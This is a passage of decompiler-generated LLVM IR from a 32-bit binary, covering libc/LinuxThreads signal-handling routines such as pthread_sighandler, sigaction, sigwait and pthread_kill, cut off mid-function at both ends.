  %v1_804c46c = load i32, i32* @global_var_8062fec.134, align 4
  %v7_804c46c = icmp ult i32 %v0_804c46c, %v1_804c46c
  %v1_804c472 = icmp eq i1 %v7_804c46c, false
  br i1 %v1_804c472, label %dec_label_pc_804c4a3, label %dec_label_pc_804c474

dec_label_pc_804c474:                             ; preds = %entry
  %v1_804c474 = load i32, i32* @global_var_8062ff0.135, align 16
  %v7_804c474 = icmp ult i32 %v0_804c46c, %v1_804c474
  br i1 %v7_804c474, label %dec_label_pc_804c489, label %dec_label_pc_804c47c

dec_label_pc_804c47c:                             ; preds = %dec_label_pc_804c474
  %v1_804c481 = load i32, i32* @global_var_8062ff4.137, align 4
  %v7_804c481 = icmp ult i32 %v0_804c46c, %v1_804c481
  br i1 %v7_804c481, label %dec_label_pc_804c4a3, label %dec_label_pc_804c489

dec_label_pc_804c489:                             ; preds = %dec_label_pc_804c47c, %dec_label_pc_804c474
  %v0_804c489 = load i32, i32* @global_var_8067650.138, align 16
  %v1_804c489 = icmp eq i32 %v0_804c489, 0
  br i1 %v1_804c489, label %dec_label_pc_804c497, label %dec_label_pc_804c492

dec_label_pc_804c492:                             ; preds = %dec_label_pc_804c489
  %v0_804c492 = call i32 @__pthread_find_self()
  br label %dec_label_pc_804c497

dec_label_pc_804c497:                             ; preds = %dec_label_pc_804c489, %dec_label_pc_804c492
  %v2_804c49d = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804c4a3

dec_label_pc_804c4a3:                             ; preds = %dec_label_pc_804c47c, %entry, %dec_label_pc_804c497
  %v0_804c4a3 = phi i32 [ ptrtoint (i32* @global_var_8062500.136 to i32), %dec_label_pc_804c47c ], [ ptrtoint (i32* @global_var_8062320 to i32), %entry ], [ %v2_804c49d, %dec_label_pc_804c497 ]
  ret i32 %v0_804c4a3

; uselistorder directives
  uselistorder label %dec_label_pc_804c4a3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c497, { 1, 0 }
}

define i32 @pthread_sighandler_rt(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804c4a4 = load i32, i32* @edi, align 4
  %v0_804c4a5 = load i32, i32* @esi, align 4
  %v0_804c4a6 = load i32, i32* @ebx, align 4
  store i32 %v0_804c4a6, i32* %stack_var_-12, align 4
  %v3_804c4a7 = call i32 @thread_self.2(i32 %v0_804c4a6, i32 %v0_804c4a5, i32 %v0_804c4a4)
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %v3_804c4a7, i32* %ebx.global-to-local, align 4
  %v1_804c4b2 = add i32 %v3_804c4a7, 88
  %v2_804c4b2 = inttoptr i32 %v1_804c4b2 to i8*
  %v3_804c4b2 = load i8, i8* %v2_804c4b2, align 1
  %v4_804c4b2 = icmp eq i8 %v3_804c4b2, 0
  br i1 %v4_804c4b2, label %dec_label_pc_804c4c1, label %dec_label_pc_804c4b8

dec_label_pc_804c4b8:                             ; preds = %entry
  store i8 0, i8* %v2_804c4b2, align 1
  %v0_804c4bc = load i32, i32* %edi.global-to-local, align 4
  %v2_804c4bc = add i32 %v3_804c4a7, 32
  %v3_804c4bc = inttoptr i32 %v2_804c4bc to i32*
  store i32 %v0_804c4bc, i32* %v3_804c4bc, align 4
  br label %dec_label_pc_804c4ea

dec_label_pc_804c4c1:                             ; preds = %entry
  %v4_804c4a6 = ptrtoint i32* %stack_var_-12 to i32
  %v1_804c4c1 = add i32 %v3_804c4a7, 84
  %v2_804c4c1 = inttoptr i32 %v1_804c4c1 to i32*
  %v3_804c4c1 = load i32, i32* %v2_804c4c1, align 4
  %v1_804c4c4 = icmp eq i32 %v3_804c4c1, 0
  store i32 %v4_804c4a6, i32* %v2_804c4c1, align 4
  %v0_804c4d4 = load i32, i32* %edi.global-to-local, align 4
  %v5_804c4d5 = mul i32 %v0_804c4d4, 4
  %v6_804c4d5 = add i32 %v5_804c4d5, ptrtoint (i32* @global_var_8062ee0.169 to i32)
  %v7_804c4d5 = inttoptr i32 %v6_804c4d5 to i32*
  %v8_804c4d5 = load i32, i32* %v7_804c4d5, align 4
  call void @__pseudo_call(i32 %v8_804c4d5)
  %v1_804c4e1 = icmp eq i1 %v1_804c4c4, false
  br i1 %v1_804c4e1, label %dec_label_pc_804c4ea, label %dec_label_pc_804c4e3

dec_label_pc_804c4e3:                             ; preds = %dec_label_pc_804c4c1
  %v0_804c4e3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c4e3 = add i32 %v0_804c4e3, 84
  %v2_804c4e3 = inttoptr i32 %v1_804c4e3 to i32*
  store i32 0, i32* %v2_804c4e3, align 4
  br label %dec_label_pc_804c4ea

dec_label_pc_804c4ea:                             ; preds = %dec_label_pc_804c4c1, %dec_label_pc_804c4b8, %dec_label_pc_804c4e3
  %v2_804c4ea = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c4ea, i32* %ebx.global-to-local, align 4
  store i32 %v0_804c4a4, i32* %edi.global-to-local, align 4
  ret i32 %v3_804c4a7

; uselistorder directives
  uselistorder i32 %v3_804c4a7, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c4ea, { 2, 0, 1 }
}

define i32 @pthread_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804c4ee = load i32, i32* @edi, align 4
  %v0_804c4ef = load i32, i32* @esi, align 4
  %v0_804c4f0 = load i32, i32* @ebx, align 4
  store i32 %v0_804c4f0, i32* %stack_var_-12, align 4
  %v3_804c4f1 = call i32 @thread_self.2(i32 %v0_804c4f0, i32 %v0_804c4ef, i32 %v0_804c4ee)
  store i32 %v3_804c4f1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %v3_804c4f1, i32* %ebx.global-to-local, align 4
  %v1_804c4fc = add i32 %v3_804c4f1, 88
  %v2_804c4fc = inttoptr i32 %v1_804c4fc to i8*
  %v3_804c4fc = load i8, i8* %v2_804c4fc, align 1
  %v4_804c4fc = icmp eq i8 %v3_804c4fc, 0
  br i1 %v4_804c4fc, label %dec_label_pc_804c50b, label %dec_label_pc_804c502

dec_label_pc_804c502:                             ; preds = %entry
  store i8 0, i8* %v2_804c4fc, align 1
  %v0_804c506 = load i32, i32* @esi, align 4
  %v1_804c506 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c506 = add i32 %v1_804c506, 32
  %v3_804c506 = inttoptr i32 %v2_804c506 to i32*
  store i32 %v0_804c506, i32* %v3_804c506, align 4
  br label %dec_label_pc_804c542

dec_label_pc_804c50b:                             ; preds = %entry
  %v4_804c4f0 = ptrtoint i32* %stack_var_-12 to i32
  %v1_804c50b = add i32 %v3_804c4f1, 84
  %v2_804c50b = inttoptr i32 %v1_804c50b to i32*
  %v3_804c50b = load i32, i32* %v2_804c50b, align 4
  %v1_804c50e = icmp eq i32 %v3_804c50b, 0
  store i32 %v4_804c4f0, i32* %v2_804c50b, align 4
  %v2_804c51a = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_804c51a, i32* %eax.global-to-local, align 4
  %v3_804c524 = bitcast i32* %stack_var_-104 to i16*
  %v4_804c524 = call i32 @memcpy(i16* %v3_804c524, i32 %v2_804c51a, i32 88)
  store i32 %v4_804c524, i32* %eax.global-to-local, align 4
  %v0_804c52c = load i32, i32* @esi, align 4
  %v5_804c52d = mul i32 %v0_804c52c, 4
  %v6_804c52d = add i32 %v5_804c52d, ptrtoint (i32* @global_var_8062ee0.169 to i32)
  %v7_804c52d = inttoptr i32 %v6_804c52d to i32*
  %v8_804c52d = load i32, i32* %v7_804c52d, align 4
  call void @__pseudo_call(i32 %v8_804c52d)
  %v1_804c539 = icmp eq i1 %v1_804c50e, false
  br i1 %v1_804c539, label %dec_label_pc_804c542, label %dec_label_pc_804c53b

dec_label_pc_804c53b:                             ; preds = %dec_label_pc_804c50b
  %v0_804c53b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c53b = add i32 %v0_804c53b, 84
  %v2_804c53b = inttoptr i32 %v1_804c53b to i32*
  store i32 0, i32* %v2_804c53b, align 4
  br label %dec_label_pc_804c542

dec_label_pc_804c542:                             ; preds = %dec_label_pc_804c50b, %dec_label_pc_804c502, %dec_label_pc_804c53b
  %v2_804c542 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c542, i32* %ebx.global-to-local, align 4
  %v0_804c545 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804c545

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_804c542, { 2, 0, 1 }
}

define i32 @__GI_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp9 = ptrtoint i32* %arg2 to i32
  %stack_var_-156 = alloca i32, align 4
  %v0_804c547 = load i32, i32* @edi, align 4
  %v0_804c548 = load i32, i32* @esi, align 4
  %v0_804c549 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804c565 = load i32, i32* @global_var_80626e8.171, align 8
  %v12_804c565 = icmp eq i32 %v1_804c565, %arg1
  br i1 %v12_804c565, label %dec_label_pc_804c60f, label %dec_label_pc_804c571

dec_label_pc_804c571:                             ; preds = %entry
  %v1_804c571 = load i32, i32* @global_var_80626ec.155, align 4
  %v12_804c571 = icmp eq i32 %v1_804c571, %arg1
  br i1 %v12_804c571, label %dec_label_pc_804c60f, label %dec_label_pc_804c57d

dec_label_pc_804c57d:                             ; preds = %dec_label_pc_804c571
  %v1_804c57d = load i32, i32* @global_var_80626f0.146, align 16
  %v12_804c57d = icmp eq i32 %v1_804c57d, %arg1
  %v1_804c583 = icmp eq i1 %v12_804c57d, false
  br i1 %v1_804c583, label %dec_label_pc_804c58d, label %dec_label_pc_804c585

dec_label_pc_804c585:                             ; preds = %dec_label_pc_804c57d
  %tmp22 = icmp slt i32 %arg1, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_804c60f, label %dec_label_pc_804c58d

dec_label_pc_804c58d:                             ; preds = %dec_label_pc_804c585, %dec_label_pc_804c57d
  %v1_804c58f = icmp eq i32* %arg2, null
  %.pre = ptrtoint i32* %stack_var_-156 to i32
  br i1 %v1_804c58f, label %dec_label_pc_804c58d.dec_label_pc_804c5d8_crit_edge, label %dec_label_pc_804c593

dec_label_pc_804c58d.dec_label_pc_804c5d8_crit_edge: ; preds = %dec_label_pc_804c58d
  br label %dec_label_pc_804c5d8

dec_label_pc_804c593:                             ; preds = %dec_label_pc_804c58d
  store i32 %.pre, i32* @esi, align 4
  %v3_804c59f = bitcast i32* %stack_var_-156 to i16*
  %v4_804c59f = call i32 @memcpy(i16* %v3_804c59f, i32 %tmp9, i32 140)
  %v2_804c5a7 = load i32, i32* %arg2, align 4
  %tmp25 = or i32 %v2_804c5a7, 1
  %tmp26 = icmp eq i32 %tmp25, 1
  br i1 %tmp26, label %dec_label_pc_804c5d4, label %dec_label_pc_804c5ac

dec_label_pc_804c5ac:                             ; preds = %dec_label_pc_804c593
  %tmp24 = icmp slt i32 %arg1, 1
  br i1 %tmp24, label %dec_label_pc_804c5d4, label %dec_label_pc_804c5b0

dec_label_pc_804c5b0:                             ; preds = %dec_label_pc_804c5ac
  %v1_804c5b0 = add i32 %arg1, -64
  %v3_804c5b0 = sub i32 63, %arg1
  %v4_804c5b0 = and i32 %v3_804c5b0, %arg1
  %v5_804c5b0 = icmp slt i32 %v4_804c5b0, 0
  %v6_804c5b0 = icmp eq i32 %v1_804c5b0, 0
  %v7_804c5b0 = icmp slt i32 %v1_804c5b0, 0
  %v3_804c5b3 = icmp eq i1 %v7_804c5b0, %v5_804c5b0
  %v4_804c5b3 = icmp eq i1 %v6_804c5b0, false
  %v5_804c5b3 = and i1 %v4_804c5b3, %v3_804c5b3
  br i1 %v5_804c5b3, label %dec_label_pc_804c5d4, label %dec_label_pc_804c5b5

dec_label_pc_804c5b5:                             ; preds = %dec_label_pc_804c5b0
  %v1_804c5b5 = add i32 %tmp9, 132
  %v2_804c5b5 = inttoptr i32 %v1_804c5b5 to i8*
  %v3_804c5b5 = load i8, i8* %v2_804c5b5, align 1
  %v4_804c5b5 = and i8 %v3_804c5b5, 4
  %v5_804c5b5 = icmp eq i8 %v4_804c5b5, 0
  %. = select i1 %v5_804c5b5, i32 134530286, i32 134530212
  store i32 %., i32* %stack_var_-156, align 4
  br label %dec_label_pc_804c5d8

dec_label_pc_804c5d4:                             ; preds = %dec_label_pc_804c5b0, %dec_label_pc_804c5ac, %dec_label_pc_804c593
  br label %dec_label_pc_804c5d8

dec_label_pc_804c5d8:                             ; preds = %dec_label_pc_804c58d.dec_label_pc_804c5d8_crit_edge, %dec_label_pc_804c5b5, %dec_label_pc_804c5d4
  %v0_804c5da = phi i32 [ 0, %dec_label_pc_804c58d.dec_label_pc_804c5d8_crit_edge ], [ %.pre, %dec_label_pc_804c5b5 ], [ %.pre, %dec_label_pc_804c5d4 ]
  %v3_804c5dc = inttoptr i32 %v0_804c5da to i32*
  %v4_804c5dc = call i32 @__libc_sigaction(i32 %arg1, i32* %v3_804c5dc, i32 %.pre)
  store i32 -1, i32* @edx, align 4
  %v8_804c5e7 = icmp eq i32 %v4_804c5dc, -1
  br i1 %v8_804c5e7, label %dec_label_pc_804c618, label %dec_label_pc_804c5ea

dec_label_pc_804c5ea:                             ; preds = %dec_label_pc_804c5d8
  %v1_804c5ea = add i32 %arg1, -1
  %v6_804c5f0 = icmp ugt i32 %v1_804c5ea, 63
  br i1 %v6_804c5f0, label %dec_label_pc_804c616, label %dec_label_pc_804c5f2

dec_label_pc_804c5f2:                             ; preds = %dec_label_pc_804c5ea
  %v1_804c5f2 = icmp eq i32 %arg3, 0
  br i1 %v1_804c5f2, label %dec_label_pc_804c600, label %dec_label_pc_804c5f6

dec_label_pc_804c5f6:                             ; preds = %dec_label_pc_804c5f2
  %v1_804c5f6 = mul i32 %arg1, 4
  %v2_804c5f6 = add i32 %v1_804c5f6, ptrtoint (i32* @global_var_8062ee0.169 to i32)
  %v3_804c5f6 = inttoptr i32 %v2_804c5f6 to i32*
  %v4_804c5f6 = load i32, i32* %v3_804c5f6, align 4
  %v2_804c5fd = inttoptr i32 %arg3 to i32*
  store i32 %v4_804c5f6, i32* %v2_804c5fd, align 4
  br label %dec_label_pc_804c600

dec_label_pc_804c600:                             ; preds = %dec_label_pc_804c5f2, %dec_label_pc_804c5f6
  br i1 %v1_804c58f, label %dec_label_pc_804c616, label %dec_label_pc_804c604

dec_label_pc_804c604:                             ; preds = %dec_label_pc_804c600
  %v2_804c604 = load i32, i32* %arg2, align 4
  %v2_804c606 = mul i32 %arg1, 4
  %v3_804c606 = add i32 %v2_804c606, ptrtoint (i32* @global_var_8062ee0.169 to i32)
  %v4_804c606 = inttoptr i32 %v3_804c606 to i32*
  store i32 %v2_804c604, i32* %v4_804c606, align 4
  br label %dec_label_pc_804c616

dec_label_pc_804c60f:                             ; preds = %dec_label_pc_804c585, %dec_label_pc_804c571, %entry
  store i32 22, i32* @edx, align 4
  br label %dec_label_pc_804c618

dec_label_pc_804c616:                             ; preds = %dec_label_pc_804c600, %dec_label_pc_804c5ea, %dec_label_pc_804c604
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_804c618

dec_label_pc_804c618:                             ; preds = %dec_label_pc_804c5d8, %dec_label_pc_804c60f, %dec_label_pc_804c616
  %v0_804c61e = phi i32 [ -1, %dec_label_pc_804c5d8 ], [ 22, %dec_label_pc_804c60f ], [ 0, %dec_label_pc_804c616 ]
  store i32 %v0_804c549, i32* @ebx, align 4
  store i32 %v0_804c548, i32* @esi, align 4
  store i32 %v0_804c547, i32* @edi, align 4
  ret i32 %v0_804c61e

; uselistorder directives
  uselistorder i32 %v1_804c5b0, { 1, 0 }
  uselistorder i32 %.pre, { 0, 3, 2, 1 }
  uselistorder i1 %v1_804c58f, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 2, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 6, 10, 11, 9, 3, 8, 7, 4, 5, 0, 1, 2, 12 }
  uselistorder label %dec_label_pc_804c618, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c616, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c600, { 1, 0 }
  uselistorder label %dec_label_pc_804c5d8, { 2, 1, 0 }
}

define i32 @sigwait(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %stack_var_-440 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %v0_804c625 = load i32, i32* @edi, align 4
  %v0_804c626 = load i32, i32* @esi, align 4
  %v0_804c627 = load i32, i32* @ebx, align 4
  store i32 1, i32* @esi, align 4
  %v3_804c633 = call i32 @thread_self.2(i32 %v0_804c627, i32 %v0_804c626, i32 %v0_804c625)
  store i32 %arg1, i32* @edi, align 4
  %v2_804c649 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804c649, i32* @ebx, align 4
  %v1_804c651 = call i32 @sigfillset(i32 %v2_804c649)
  %v1_804c65f = call i32 @__GI_sigdelset(i32 %v2_804c649)
  %v0_804c6ee.pr = load i32, i32* @esi, align 4
  %v2_804c6bf = ptrtoint i32* %stack_var_-280 to i32
  %v2_804c6c6 = ptrtoint i32* %stack_var_-284 to i32
  %v7_804c6f126 = icmp sgt i32 %v0_804c6ee.pr, 65
  br i1 %v7_804c6f126, label %dec_label_pc_804c6f7, label %dec_label_pc_804c66c.lr.ph

dec_label_pc_804c66c.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804c66c

dec_label_pc_804c66c:                             ; preds = %dec_label_pc_804c66c.lr.ph, %dec_label_pc_804c6ed
  %v0_804c66e28 = phi i32 [ %v0_804c6ee.pr, %dec_label_pc_804c66c.lr.ph ], [ %v1_804c6ed, %dec_label_pc_804c6ed ]
  %v3_804c67027 = phi i32 [ %v1_804c65f, %dec_label_pc_804c66c.lr.ph ], [ %v0_804c6f72, %dec_label_pc_804c6ed ]
  %v0_804c66f = load i32, i32* @edi, align 4
  %v4_804c670 = call i32 @sigismember(i32 %v0_804c66f, i32 %v0_804c66e28, i32 %v3_804c67027, i32 %v3_804c67027)
  %v1_804c678 = icmp eq i32 %v4_804c670, 0
  br i1 %v1_804c678, label %dec_label_pc_804c6ed, label %dec_label_pc_804c67c

dec_label_pc_804c67c:                             ; preds = %dec_label_pc_804c66c
  %v0_804c67c = load i32, i32* @esi, align 4
  %v1_804c67c = load i32, i32* @global_var_80626e8.171, align 8
  %v12_804c67c = icmp eq i32 %v0_804c67c, %v1_804c67c
  br i1 %v12_804c67c, label %dec_label_pc_804c6ed, label %dec_label_pc_804c684

dec_label_pc_804c684:                             ; preds = %dec_label_pc_804c67c
  %v1_804c684 = load i32, i32* @global_var_80626ec.155, align 4
  %v12_804c684 = icmp eq i32 %v0_804c67c, %v1_804c684
  br i1 %v12_804c684, label %dec_label_pc_804c6ed, label %dec_label_pc_804c68c

dec_label_pc_804c68c:                             ; preds = %dec_label_pc_804c684
  %v1_804c68c = load i32, i32* @global_var_80626f0.146, align 16
  %v12_804c68c = icmp eq i32 %v0_804c67c, %v1_804c68c
  br i1 %v12_804c68c, label %dec_label_pc_804c6ed, label %dec_label_pc_804c694

dec_label_pc_804c694:                             ; preds = %dec_label_pc_804c68c
  %v1_804c69f = call i32 @__GI_sigdelset(i32 %v2_804c649)
  %v0_804c6a7 = load i32, i32* @esi, align 4
  %v1_804c6a7 = mul i32 %v0_804c6a7, 4
  %v2_804c6a7 = add i32 %v1_804c6a7, ptrtoint (i32* @global_var_8062ee0.169 to i32)
  %v3_804c6a7 = inttoptr i32 %v2_804c6a7 to i32*
  %v4_804c6a7 = load i32, i32* %v3_804c6a7, align 4
  %tmp29 = or i32 %v4_804c6a7, 1
  %tmp30 = icmp eq i32 %tmp29, 1
  br i1 %tmp30, label %dec_label_pc_804c6b1, label %dec_label_pc_804c6ed

dec_label_pc_804c6b1:                             ; preds = %dec_label_pc_804c694
  store i32 ptrtoint (i32* @global_var_804c464.172 to i32), i32* %stack_var_-284, align 4
  store i32 %v2_804c6c6, i32* @ebx, align 4
  %v1_804c6ce = call i32 @sigemptyset(i32 %v2_804c6bf)
  %v0_804c6e4 = load i32, i32* @esi, align 4
  %v4_804c6e5 = call i32 @__GI_sigaction(i32 %v0_804c6e4, i32* nonnull %stack_var_-284, i32 0)
  br label %dec_label_pc_804c6ed

dec_label_pc_804c6ed:                             ; preds = %dec_label_pc_804c694, %dec_label_pc_804c68c, %dec_label_pc_804c684, %dec_label_pc_804c67c, %dec_label_pc_804c66c, %dec_label_pc_804c6b1
  %v0_804c6f72 = phi i32 [ %v1_804c69f, %dec_label_pc_804c694 ], [ %v4_804c670, %dec_label_pc_804c68c ], [ %v4_804c670, %dec_label_pc_804c684 ], [ %v4_804c670, %dec_label_pc_804c67c ], [ 0, %dec_label_pc_804c66c ], [ %v4_804c6e5, %dec_label_pc_804c6b1 ]
  %v0_804c6ed = load i32, i32* @esi, align 4
  %v1_804c6ed = add i32 %v0_804c6ed, 1
  store i32 %v1_804c6ed, i32* @esi, align 4
  %v7_804c6f1 = icmp sgt i32 %v1_804c6ed, 65
  br i1 %v7_804c6f1, label %dec_label_pc_804c6f7, label %dec_label_pc_804c66c

dec_label_pc_804c6f7:                             ; preds = %dec_label_pc_804c6ed, %entry
  %v2_804c6fb = ptrtoint i32* %stack_var_-440 to i32
  %v3_804c700 = call i32 @__sigsetjmp(i32 %v2_804c6fb, i32* inttoptr (i32 1 to i32*))
  %v1_804c708 = icmp eq i32 %v3_804c700, 0
  %v1_804c70a = icmp eq i1 %v1_804c708, false
  br i1 %v1_804c70a, label %dec_label_pc_804c6f7.dec_label_pc_804c760_crit_edge, label %dec_label_pc_804c70c

dec_label_pc_804c6f7.dec_label_pc_804c760_crit_edge: ; preds = %dec_label_pc_804c6f7
  %.pre = add i32 %v3_804c633, 40
  %.pre3 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_804c760

dec_label_pc_804c70c:                             ; preds = %dec_label_pc_804c6f7
  %v2_804c717 = add i32 %v3_804c633, 40
  %v3_804c717 = inttoptr i32 %v2_804c717 to i32*
  store i32 %v2_804c6fb, i32* %v3_804c717, align 4
  %v1_804c721 = add i32 %v3_804c633, 66
  %v2_804c721 = inttoptr i32 %v1_804c721 to i8*
  %v3_804c721 = load i8, i8* %v2_804c721, align 1
  %v4_804c721 = icmp eq i8 %v3_804c721, 0
  br i1 %v4_804c721, label %dec_label_pc_804c734, label %dec_label_pc_804c727

dec_label_pc_804c727:                             ; preds = %dec_label_pc_804c70c
  %v1_804c72e = add i32 %v3_804c633, 64
  %v2_804c72e = inttoptr i32 %v1_804c72e to i8*
  %v3_804c72e = load i8, i8* %v2_804c72e, align 1
  %v4_804c72e = icmp eq i8 %v3_804c72e, 0
  br i1 %v4_804c72e, label %dec_label_pc_804c760, label %dec_label_pc_804c734

dec_label_pc_804c734:                             ; preds = %dec_label_pc_804c727, %dec_label_pc_804c70c
  %v1_804c73b = add i32 %v3_804c633, 32
  %v2_804c73b = inttoptr i32 %v1_804c73b to i32*
  store i32 0, i32* %v2_804c73b, align 4
  %v1_804c74c = add i32 %v3_804c633, 88
  %v2_804c74c = inttoptr i32 %v1_804c74c to i8*
  store i8 1, i8* %v2_804c74c, align 1
  %v1_804c758 = bitcast i32* %stack_var_-144 to %_TYPEDEF_sigset_t*
  %v2_804c758 = call i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %v1_804c758)
  br label %dec_label_pc_804c760

dec_label_pc_804c760:                             ; preds = %dec_label_pc_804c6f7.dec_label_pc_804c760_crit_edge, %dec_label_pc_804c727, %dec_label_pc_804c734
  %v2_804c767.pre-phi = phi i32* [ %.pre3, %dec_label_pc_804c6f7.dec_label_pc_804c760_crit_edge ], [ %v3_804c717, %dec_label_pc_804c727 ], [ %v3_804c717, %dec_label_pc_804c734 ]
  store i32 0, i32* %v2_804c767.pre-phi, align 4
  %v0_804c76e = call i32 @pthread_testcancel()
  %v1_804c781 = add i32 %v3_804c633, 32
  %v2_804c781 = inttoptr i32 %v1_804c781 to i32*
  %v3_804c781 = load i32, i32* %v2_804c781, align 4
  store i32 %v3_804c781, i32* %arg2, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804c6ed, { 0, 2, 1 }
  uselistorder i32 %v4_804c670, { 3, 2, 1, 0 }
  uselistorder i32 %v3_804c67027, { 1, 0 }
  uselistorder i32 %v3_804c633, { 6, 1, 3, 2, 4, 5, 0 }
  uselistorder i32 (i32)* @sigfillset, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @thread_self.2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c760, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c6ed, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804c66c, { 1, 0 }
}

define i32 @pthread_kill(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804c792 = load i32, i32* @esi, align 4
  %v0_804c793 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804c79f = urem i32 %arg1, 1024
  %v2_804c7a4 = mul nuw nsw i32 %v1_804c79f, 16
  %v1_804c7a7 = add i32 %v2_804c7a4, ptrtoint (i32* @global_var_805e300.147 to i32)
  store i32 %v1_804c7a7, i32* @esi, align 4
  store i32 %v1_804c7a7, i32* @eax, align 4
  %v1_804c7af = call i32 @__pthread_lock(i32 %v0_804c793)
  %v0_804c7b4 = load i32, i32* @esi, align 4
  %v1_804c7b4 = add i32 %v0_804c7b4, 8
  %v2_804c7b4 = inttoptr i32 %v1_804c7b4 to i32*
  %v3_804c7b4 = load i32, i32* %v2_804c7b4, align 4
  %v1_804c7b7 = icmp eq i32 %v3_804c7b4, 0
  br i1 %v1_804c7b7, label %dec_label_pc_804c7c0, label %dec_label_pc_804c7bb

dec_label_pc_804c7bb:                             ; preds = %entry
  %v1_804c7bb = add i32 %v3_804c7b4, 16
  %v2_804c7bb = inttoptr i32 %v1_804c7bb to i32*
  %v3_804c7bb = load i32, i32* %v2_804c7bb, align 4
  %v4_804c7bb = load i32, i32* @ebx, align 4
  %v15_804c7bb = icmp eq i32 %v3_804c7bb, %v4_804c7bb
  br i1 %v15_804c7bb, label %dec_label_pc_804c7d3, label %dec_label_pc_804c7c0

dec_label_pc_804c7c0:                             ; preds = %dec_label_pc_804c7bb, %entry
  store i32 %v0_804c7b4, i32* %stack_var_-28, align 4
  %v1_804c7c4 = inttoptr i32 %v0_804c7b4 to i32*
  %v2_804c7c4 = call i32 @__pthread_unlock(i32* %v1_804c7c4)
  br label %dec_label_pc_804c7fa

dec_label_pc_804c7d3:                             ; preds = %dec_label_pc_804c7bb
  %v1_804c7d6 = add i32 %v3_804c7b4, 20
  %v2_804c7d6 = inttoptr i32 %v1_804c7d6 to i32*
  %v3_804c7d6 = load i32, i32* %v2_804c7d6, align 4
  store i32 %v3_804c7d6, i32* @ebx, align 4
  store i32 %v0_804c7b4, i32* %stack_var_-28, align 4
  %v1_804c7da = inttoptr i32 %v0_804c7b4 to i32*
  %v2_804c7da = call i32 @__pthread_unlock(i32* %v1_804c7da)
  %v0_804c7e5 = load i32, i32* @ebx, align 4
  store i32 %v0_804c7e5, i32* %stack_var_-28, align 4
  %v2_804c7e6 = call i32 @kill(i32 %v0_804c7e5, i32 %arg2)
  %v8_804c7f0 = icmp eq i32 %v2_804c7e6, -1
  %v1_804c7f1 = icmp eq i1 %v8_804c7f0, false
  br i1 %v1_804c7f1, label %dec_label_pc_804c7fa, label %dec_label_pc_804c7f3

dec_label_pc_804c7f3:                             ; preds = %dec_label_pc_804c7d3
  %v0_804c7f3 = load i32, i32* %stack_var_-28, align 4
  %v1_804c7f3 = call i32 @__errno_location(i32 %v0_804c7f3)
  %v1_804c7f8 = inttoptr i32 %v1_804c7f3 to i32*
  %v2_804c7f8 = load i32, i32* %v1_804c7f8, align 4
  br label %dec_label_pc_804c7fa

dec_label_pc_804c7fa:                             ; preds = %dec_label_pc_804c7d3, %dec_label_pc_804c7c0, %dec_label_pc_804c7f3
  %v0_804c7fa = phi i32 [ 0, %dec_label_pc_804c7d3 ], [ 3, %dec_label_pc_804c7c0 ], [ %v2_804c7f8, %dec_label_pc_804c7f3 ]
  store i32 %v0_804c792, i32* @esi, align 4
  ret i32 %v0_804c7fa

; uselistorder directives
  uselistorder i32 %v3_804c7b4, { 1, 0, 2 }
  uselistorder i32 %v0_804c7b4, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_804c7fa, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804c800 = load i32, i32* @ebx, align 4
  store i32 %v0_804c800, i32* %stack_var_-4, align 4
  %v1_804c804 = call i32 @__GI_pthread_self(i32 %v0_804c800)
  %v0_804c809 = load i32, i32* @ebx, align 4
